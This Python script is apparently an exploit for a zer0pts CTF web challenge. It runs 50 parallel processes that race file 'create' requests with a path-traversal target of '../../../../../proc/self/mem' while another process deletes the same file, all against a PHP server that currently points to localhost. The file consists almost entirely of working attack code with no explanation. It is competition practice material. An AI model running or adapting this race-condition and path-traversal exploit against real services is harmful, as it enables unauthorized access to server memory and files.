import requests, multiprocessing
from time import sleep

#URL = 'http://any.ctf.zer0pts.com:9081/'
URL = 'http://localhost:8080'   

def race(idx):
    s = requests.Session()
    s.cookies['PHPSESSID'] = '!?!$@#'+str(idx)
    sleep(0.45 + 0.01*idx)
    print('racer {} sent'.format(idx))
    s.post(URL, data={'mode': 'create', 'name': 'yee', 'type': '1', 'target': '../../../../../proc/self/mem'})
    print('racer {} recv'.format(idx))

def kill():
    s = requests.Session()
    s.cookies['PHPSESSID'] = '#$?#@?'
    sleep(0.25)
    print('killer sent')
    assert 'file not found' not in s.post(URL, data={'mode': 'delete', 'name': 'yee'}).text
    print('killer recv')

def read_race(idx):
    s = requests.Session()
    s.cookies['PHPSESSID'] = '#!$??'+str(idx)
    print('reader {} sent'.format(idx))
    res = s.post(URL, data={'mode': 'read', 'name': 'yeee'}).text
    print('reader {} recv'.format(idx))
    if 'file not found' in res:
        print('file not found :(')
    else:
        print('yeet!')

if __name__ == '__main__':
    s = requests.Session()
    s.cookies['PHPSESSID'] = '?!$?#'

    RACER_SIZE = 50
    racers = [None] * RACER_SIZE
    read_racers = [None] * 1
    while True:
        s.post(URL, data={'mode': 'delete', 'name': 'yee'})
        s.post(URL, data={'mode': 'create', 'name': 'yee'})
        s.post(URL, data={'mode': 'write', 'name': 'yee', 'data': 'YEET!' * 0x100})
        for i in range(len(racers)):
            racers[i] = multiprocessing.Process(target=race, args=(i,))
            racers[i].start()
        killer = multiprocessing.Process(target=kill, args=tuple())
        killer.start()
        #for i in range(len(read_racers)):
        #    read_racers[i] = multiprocessing.Process(target=read_race, args=(i,))
        #    read_racers[i].start()
        #for i in range(len(read_racers)):
        #    res = read_racers[i].join()
        print('waiting for racers join')
        for i in range(len(racers)):
            racers[i].join()
        killer.join()
        print('sleeping a second...')
        sleep(1)
